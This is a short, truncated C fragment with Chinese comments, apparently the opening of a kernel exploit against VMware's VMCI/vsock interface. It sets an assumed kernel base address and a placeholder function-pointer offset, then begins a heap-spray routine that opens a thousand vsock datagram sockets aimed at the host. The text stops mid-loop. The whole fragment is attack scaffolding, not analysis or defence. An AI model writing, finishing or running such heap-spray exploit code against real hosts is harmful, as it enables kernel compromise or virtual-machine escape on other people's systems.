#include <unistd.h>

// 假设已知内核基址和偏移
#define KERNEL_BASE 0xffffffff80000000ULL
#define FUNC_PTR_OFFSET 0x123456 // 需要逆向获取

void heap_spray() {
    // 发送大量正常VMCI消息，填充堆
    for (int i = 0; i < 1000; i++) {
        int sock = socket(AF_VSOCK, SOCK_DGRAM, 0);
        struct sockaddr_vm addr = {0};
        addr.svm_family = AF_VSOCK;
        addr.svm_cid = VMADDR_CID_HOST;
        addr.svm_port = 0x1234;
